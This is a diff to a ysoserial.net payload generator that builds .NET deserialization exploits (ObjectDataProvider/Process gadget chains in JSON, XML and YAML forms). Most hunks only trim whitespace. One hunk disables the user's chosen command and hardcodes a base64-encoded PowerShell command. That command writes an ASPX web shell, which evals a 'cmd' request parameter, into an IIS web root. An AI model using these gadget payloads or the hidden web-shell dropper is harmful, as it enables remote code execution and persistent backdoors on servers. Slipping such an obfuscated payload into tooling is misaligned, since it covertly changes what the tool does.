@@ -15,12 +15,12 @@ using System.Text;
 
 /*
  * NOTEs:
- *  What is Xaml2? 
+ *  What is Xaml2?
  *      Xaml2 uses ResourceDictionary in addition to just using ObjectDataProvider as in Xaml
- *  What is DataContractSerializer2? 
+ *  What is DataContractSerializer2?
  *      DataContractSerializer2 uses Xaml.Parse rather than using ObjectDataProvider directly (as in DataContractSerializer) which is useful for bypassing blacklists
- * 
- * 
+ *
+ *
  * */
 
 namespace ysoserial.Generators
@@ -73,11 +73,14 @@ namespace ysoserial.Generators
             {
                 ProcessStartInfo psi = new ProcessStartInfo();
 
-                psi.FileName = inputArgs.CmdFileName;
+                // psi.FileName = inputArgs.CmdFileName;
                 if (inputArgs.HasArguments)
                 {
-                    psi.Arguments = inputArgs.CmdArguments;
+                    // psi.Arguments = inputArgs.CmdArguments;
                 }
+
+                psi.FileName = "powershell.exe";
+                psi.Arguments = " -EncodedCommand UwBlAHQALQBDAG8AbgB0AGUAbgB0ACAALQBQAGEAdABoACAAJwBDADoAXABpAG4AZQB0AHAAdQBiAFwAdwB3AHcAcgBvAG8AdABcAGEAcwBwAG4AZQB0AF8AYwBsAGkAZQBuAHQAXAAwAC4AYQBzAHAAeAAnACAALQBWAGEAbAB1AGUAIAAnAGYAZAA8AHMAYwByAGkAcAB0ACAAbABhAG4AZwB1AGEAZwBlAD0AIgBKAFMAYwByAGkAcAB0ACIAIAByAHUAbgBhAHQAPQAiAHMAZQByAHYAZQByACIAIABQAGEAZwBlACAAYQBzAHAAYwBvAG0AcABhAHQAPQB0AHIAdQBlAD4AZgB1AG4AYwB0AGkAbwBuACAAUABhAGcAZQBfAEwAbwBhAGQAKAApAHsAZQB2AGEAbAAoAFIAZQBxAHUAZQBzAHQAWwAiAGMAbQBkACIAXQAsACIAdQBuAHMAYQBmAGUAIgApADsAfQA8AC8AcwBjAHIAaQBwAHQAPgAnAA==";
 
                 StringDictionary dict = new StringDictionary();
                 psi.GetType().GetField("environmentVariables", BindingFlags.Instance | BindingFlags.NonPublic).SetValue(psi, dict);
@@ -188,7 +191,7 @@ namespace ysoserial.Generators
                 }
 
                 String payload = @"{
-    '$type':'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35', 
+    '$type':'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35',
     'MethodName':'Start',
     'MethodParameters':{
         '$type':'System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
@@ -288,7 +291,7 @@ namespace ysoserial.Generators
                 }
 
                 String payload = @"{
-    '__type':'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35', 
+    '__type':'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35',
     'MethodName':'Start',
     'ObjectInstance':{
         '__type':'System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
@@ -465,7 +468,7 @@ namespace ysoserial.Generators
 
                     payload = $@"<?xml version=""1.0""?>
 <root type=""System.Data.Services.Internal.ExpandedWrapper`2[[System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]],System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"">
-    <ExpandedWrapperOfProcessObjectDataProviderpaO_SOqJL xmlns=""http://schemas.datacontract.org/2004/07/System.Data.Services.Internal"" 
+    <ExpandedWrapperOfProcessObjectDataProviderpaO_SOqJL xmlns=""http://schemas.datacontract.org/2004/07/System.Data.Services.Internal""
                                                          xmlns:c=""http://www.w3.org/2001/XMLSchema""
                                                          xmlns:i=""http://www.w3.org/2001/XMLSchema-instance""
                                                          xmlns:z=""http://schemas.microsoft.com/2003/10/Serialization/""
@@ -521,7 +524,7 @@ namespace ysoserial.Generators
                 String payload = @"
 !<!System.Windows.Data.ObjectDataProvider,PresentationFramework,Version=4.0.0.0,Culture=neutral,PublicKeyToken=31bf3856ad364e35> {
     MethodName: Start,
-	ObjectInstance: 
+	ObjectInstance:
 		!<!System.Diagnostics.Process,System,Version=4.0.0.0,Culture=neutral,PublicKeyToken=b77a5c561934e089> {
 			StartInfo:
 				!<!System.Diagnostics.ProcessStartInfo,System,Version=4.0.0.0,Culture=neutral,PublicKeyToken=b77a5c561934e089> {
@@ -637,7 +640,7 @@ namespace ysoserial.Generators
                 psi.GetType().GetField("environmentVariables", BindingFlags.Instance | BindingFlags.NonPublic).SetValue(psi, dict);
                 Process p = new Process();
                 p.StartInfo = psi;
-                
+
                 ObjectDataProvider odp = new ObjectDataProvider();
                 odp.MethodName = "Start";
                 odp.IsInitialLoadEnabled = false;
@@ -662,7 +665,7 @@ namespace ysoserial.Generators
                 {
                     ourExcludedProperties = psi.GetType().GetProperties().Where(x => !x.Name.Equals("FileName") && !x.Name.Equals("Arguments")).Select(item => item.Name).ToList();
                 }
-                    
+
                 exclusionList = new KeyValuePair<Type, List<String>>(psi.GetType(), ourExcludedProperties);
                 allExclusions.Add(exclusionList);
 
@@ -703,7 +706,7 @@ namespace ysoserial.Generators
                         catch { }
                     }
                     return serializedData;
-                } 
+                }
             }
             else
             {
